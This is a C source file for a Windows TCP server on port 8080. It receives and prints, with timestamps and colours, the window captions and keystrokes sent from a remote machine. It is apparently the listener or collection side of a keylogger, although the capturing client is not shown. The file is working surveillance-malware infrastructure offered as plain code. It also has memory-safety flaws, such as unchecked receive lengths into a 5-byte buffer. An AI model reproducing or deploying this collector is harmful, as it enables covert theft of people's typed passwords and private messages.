#include <stdio.h>
#include <winsock2.h>
#include <unistd.h>
#include <stdint.h>

#define MSG_BUFF_LEN 5
#define ENTER 13
BOOL checkIfArrChanged(char newMsgBuff[MSG_BUFF_LEN], char prevMsgBuff[MSG_BUFF_LEN]) {
    int itrIdx;
    if (strlen(newMsgBuff) > strlen(prevMsgBuff)) return TRUE;  // added a new character
    else if (strlen(newMsgBuff) < strlen(prevMsgBuff)) return TRUE; // backspace
    else return FALSE;  // nothing changed
}

void deleteLine() {
    printf("\033[K");
}

void jumpDown() {
    printf("\033[B");
}

void jumpUp() {
    printf("\033[F");
}

void moveCursorToStartOfLine() {
    printf("\r");
}

void printGreen() {
    printf("\033[0;32m");
}

void printCyan() {
    printf("\033[0;36m");
}

void printMagenta() {
    printf("\033[0;35m");
}

void printBlue() {
    printf("\033[0;34m");
}

void endCol() {
    printf("\033[0m");
}

int main() {
    SetConsoleOutputCP(CP_UTF8);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET server_socket;
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8080);

    bind(server_socket, (struct sockaddr*)&server, sizeof(server));
    listen(server_socket, 3);

    printf("Listening for Connection ... \n");
    struct sockaddr_in clientObject;
    int clientObjectLen = sizeof(clientObject);

    SOCKET client_socket = accept(server_socket, (struct sockaddr*)&clientObject, &clientObjectLen);
    printf("Client Connected\n");

    SYSTEMTIME st;
    GetLocalTime(&st);

    char newMsgBuff[MSG_BUFF_LEN];
    char windowCapBuff[256];
    char prevWinCap[256];

    printf("START OF LOG: \n");
    printf("+--------------------------------------------------------+\n");

    WORD dayVar;
    uint8_t capLen;
    uint8_t keyLen;

    while (1) {
        int capL = recv(client_socket, &capLen, 1, 0);
        if (capL <= 0) {
            printf("\n\nDISCONECTTED\n\n");
            break;
        }
        windowCapBuff[0] = '\0'; // reset buffer
        int cap = recv(client_socket, windowCapBuff, capLen, 0);
        windowCapBuff[cap] = '\0';
        int msgLen = recv(client_socket, &keyLen, 1, 0);
        int msg = recv(client_socket, newMsgBuff, keyLen, 0);
        SYSTEMTIME st;
        GetLocalTime(&st);

        if (dayVar != st.wDay) {
            dayVar = st.wDay;
            printCyan();
            printf("[%02d/%02d/%02d]\n", st.wMonth, st.wDay, st.wYear);
            endCol();
        }
        if (strcmp(windowCapBuff, prevWinCap) != 0) {
            printf("  |  ");
            printCyan();
            printf("[%02d:%02d:%02d]", st.wHour, st.wMinute, st.wSecond);
            endCol();
            printf(" ~ ");
            printMagenta();
            printf("%s\n", windowCapBuff);
            endCol();
        }
        prevWinCap[0] = '\0';
        strcpy(prevWinCap, windowCapBuff);
        // printf("Caption: %s - StrLen: %d - CapLen: %d\n", windowCapBuff, strlen(windowCapBuff), capLen);
        printf("  |  |  ");
        printCyan();
        printf("[%02d:%02d:%02d]", st.wHour, st.wMinute, st.wSecond);
        endCol();
        printBlue();
        printf(" Keystroke: %s\n", newMsgBuff);
        endCol();
    }
    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    return 0;
}